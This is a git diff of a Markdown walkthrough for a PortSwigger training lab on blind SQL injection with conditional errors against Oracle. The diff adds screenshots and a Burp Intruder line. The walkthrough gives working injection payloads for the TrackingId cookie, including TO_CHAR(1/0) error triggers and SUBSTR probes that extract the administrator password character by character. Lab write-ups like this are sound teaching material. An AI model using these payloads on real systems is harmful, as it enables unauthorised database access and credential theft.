@@ -1,5 +1,6 @@
 This is the **PortSwigger Blind SQL Injection with Conditional Errors** lab using an **Oracle database**. The key idea is different from the previous Boolean-response lab: here, you infer whether a condition is true by deliberately causing a database error.
 
+
 ## Objective
 
 The objective of this lab is to **identify and exploit a blind SQL injection vulnerability in an Oracle database using conditional errors**. You will use Burp Suite to:
@@ -12,6 +13,8 @@ The objective of this lab is to **identify and exploit a blind SQL injection vul
 6. Reconstruct the complete administrator password and use it to log in to the application.
 
 
+
+
 # 1. Confirm the injection point
 
 Start with:
@@ -22,6 +25,10 @@ TrackingId=xyz'
 
 If you receive an error, the added `'` has probably made the SQL syntax invalid.
 
+
+<img width="1280" height="737" alt="WhatsApp Image 2026-07-30 at 14 49 41 (2)" src="https://github.com/user-attachments/assets/be30d63d-1701-4378-b1d8-8dfb0a0105db" />
+
+
 Now try:
 
 ```http
@@ -31,6 +38,9 @@ TrackingId=xyz''
 If the error disappears, the second quote has effectively balanced the quote introduced by the first one.
 
 This establishes a useful **error/no-error signal**.
+
+<img width="1280" height="737" alt="WhatsApp Image 2026-07-30 at 14 49 41 (4)" src="https://github.com/user-attachments/assets/e1aaa847-9486-4d86-aee6-bf93cfa3d530" />
+
 
 ---
 
@@ -44,6 +54,9 @@ xyz'||(SELECT '')||'
 
 If this produces an error, the syntax may not match the target database.
 
+<img width="1280" height="737" alt="WhatsApp Image 2026-07-30 at 14 49 41 (1)" src="https://github.com/user-attachments/assets/3e32995b-791c-4aae-803c-13c03d905f74" />
+
+
 Because Oracle requires a `FROM` clause for this kind of `SELECT`, try:
 
 ```sql
@@ -51,6 +64,9 @@ xyz'||(SELECT '' FROM dual)||'
 ```
 
 If the error disappears, that is strong evidence that the backend is **Oracle**.
+
+<img width="1280" height="738" alt="WhatsApp Image 2026-07-30 at 14 49 41 (5)" src="https://github.com/user-attachments/assets/7312790e-e96b-4034-8716-fac9ff7f5308" />
+
 
 ### Why `dual`?
 
@@ -75,6 +91,9 @@ xyz'||(SELECT '' FROM not-a-real-table)||'
 ```
 
 You should receive an error.
+
+<img width="1280" height="718" alt="WhatsApp Image 2026-07-30 at 14 49 41" src="https://github.com/user-attachments/assets/f0f848c9-d94c-4d0a-96bb-7c27fe86785b" />
+
 
 Compare:
 
@@ -109,6 +128,9 @@ TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
 ```
 
 If there is no error, you can infer that the `users` table exists.
+
+<img width="1275" height="770" alt="Screenshot 2026-08-08 at 10 04 23 PM" src="https://github.com/user-attachments/assets/ce6ee24e-5d4f-40a9-81bb-a004261749f9" />
+
 
 ### Why `ROWNUM = 1`?
 
@@ -154,6 +176,10 @@ Therefore:
 
 **TRUE → HTTP error**
 
+
+<img width="1275" height="770" alt="Screenshot 2026-08-08 at 10 08 05 PM" src="https://github.com/user-attachments/assets/84f18015-9404-43fb-8413-d0c4cb08cc6f" />
+
+
 Now change the condition:
 
 ```sql
@@ -178,7 +204,10 @@ Therefore:
 
 **FALSE → no error**
 
-You've now created a **Boolean-to-error oracle**:
+<img width="1273" height="645" alt="Screenshot 2026-08-08 at 10 11 22 PM" src="https://github.com/user-attachments/assets/3e2e2059-eec5-4733-bb8b-c0321b3031d1" />
+
+
+Have now created a **Boolean-to-error oracle**:
 
 ```text
 Condition TRUE
@@ -208,6 +237,10 @@ If an error occurs, the query found the administrator row.
 
 The important point is that the error itself doesn't tell you the username. Instead, it tells you that your **condition was satisfied**.
 
+
+<img width="1276" height="716" alt="Screenshot 2026-08-08 at 10 15 01 PM" src="https://github.com/user-attachments/assets/c618678a-4d09-4cd7-9583-83e17119b623" />
+
+
 ---
 
 # 7. Determine the password length
@@ -225,6 +258,9 @@ If an error occurs:
 ```text
 LENGTH(password) > 1
 ```
+
+<img width="1280" height="734" alt="Screenshot 2026-08-08 at 10 17 28 PM" src="https://github.com/user-attachments/assets/929e9108-cc05-43c0-a4db-f6f991fba5a6" />
+
 
 is true.
 
@@ -262,6 +298,14 @@ Now you know:
 ```text
 Password length = 20
 ```
+
+Find it quickly using intruder:
+
+<img width="1280" height="765" alt="Screenshot 2026-08-08 at 9 52 01 PM" src="https://github.com/user-attachments/assets/76325e01-6d17-4c53-b84b-4cb8bac8c7de" />
+
+
+<img width="1277" height="764" alt="Screenshot 2026-08-08 at 9 52 40 PM" src="https://github.com/user-attachments/assets/73233546-a86a-46f5-afdc-a4e0cd2542f9" />
+
 
 The next question is:
 
@@ -306,11 +350,19 @@ FALSE
 HTTP 200
 ```
 
+<img width="1278" height="683" alt="Screenshot 2026-08-08 at 10 18 54 PM" src="https://github.com/user-attachments/assets/422661af-4a52-4382-89d5-77306dd4133f" />
+
+
 ---
 
 # 9. Automate character testing with Burp Intruder
 
 Send the request to **Intruder**.
+
+```sql
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
 
 The relevant portion should look like:
 
@@ -330,6 +382,10 @@ a-z
 The lab's password is assumed to contain only lowercase alphanumeric characters.
 
 Launch the attack.
+
+<img width="1280" height="767" alt="Screenshot 2026-08-08 at 10 24 28 PM" src="https://github.com/user-attachments/assets/a54526d7-fb19-4584-9bcc-f34d88f036b2" />
+
+<img width="1276" height="737" alt="Screenshot 2026-08-08 at 10 24 01 PM" src="https://github.com/user-attachments/assets/b9dc1515-2681-454c-939a-ea827eb5c0ab" />
 
 ---
 
